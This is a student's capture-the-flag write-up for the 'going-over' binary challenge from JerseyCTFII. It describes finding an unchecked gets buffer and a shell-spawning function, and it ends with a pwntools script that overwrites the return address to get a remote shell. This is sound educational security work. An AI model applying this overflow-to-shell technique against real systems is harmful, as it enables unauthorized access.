# Introduction

I am a Cyberfellow (MS in Cybersecurity) at New York University (NYU). I am taking offensive security in Spring 2022. This class requires that I participate in a CTF (Capture The Flag) competition and produce a write-up. I and two of my classmates participated in JerceyCTFII that was hosted on April 9 - 10, 2022. Mitchell has a nice [write-up](https://github.com/Cellolizard/CTF-Writeups/tree/main/jerseyctfII) of the work that we did as a team. I would focus on two challenges that I was able to solve independently.

The class requirement was that the challenges should be moderately challenging, usually more than 300 points.

# going-over (350 points)
**Challenge:** My friends said they were going on a trip but I think they ran into some trouble. They sent me these two files before we lost contact (src.c and going-over). nc 0.cloud.chals.io 10197 

**Solution:** The 'going-over' was a binary file. I used the tool 'cutter' to get a general understanding of the binary. The overview tab was useful to know that there was no canary, no PIE, and NX was enabled.  

![Overview](https://github.com/a759116/CTF-Writeups/blob/main/jerseyctfii/src/go-cutter-overview.png)

The **Strings** tab revealed that the binary had the string '/bin/sh'.  

![Strings](https://github.com/a759116/CTF-Writeups/blob/main/jerseyctfii/src/go-cutter-string.png)

The **Imports** tab revealed two interesting functions: a) grets, indicating that there was possibility for Buffer Overflow (BOF), and b) execve, ability to launch shell using already found string '/bin/sh'. 

![Imports](https://github.com/a759116/CTF-Writeups/blob/main/jerseyctfii/src/go-cutter-imports.png)

Opening the binary in Ghidra, I found that there was a buffer of size 12 bytes.  

![Ghidra main](https://github.com/a759116/CTF-Writeups/blob/main/jerseyctfii/src/go-ghidra-main.png)

With all the information discovered so far, I had a hunch that I would have to perform a stack overflow and overwrite the return address so that execve can be executed with '/bin/sh' as parameter. The next question was how to achieve it. With further digging, I found the function grab_ledge at address 004011b6. This function was executing execve with '/bin/sh' as parameter.  

![grab_ledge](https://github.com/a759116/CTF-Writeups/blob/main/jerseyctfii/src/go-ghidra-ledge.png)

I had all the pieces together now. I wrote and executed the python code below that revealed the flag.

```python
from pwn import *
p = process('./going-over')
p = remote("0.cloud.chals.io", 10197)
p.recvuntil("but I can't find it!!!")
exploit = b'A'*20+ b'\xb6\x11\x40\x00\x00\x00\x00\x00'
print(exploit)
p.sendline(exploit)
p.interactive()
```
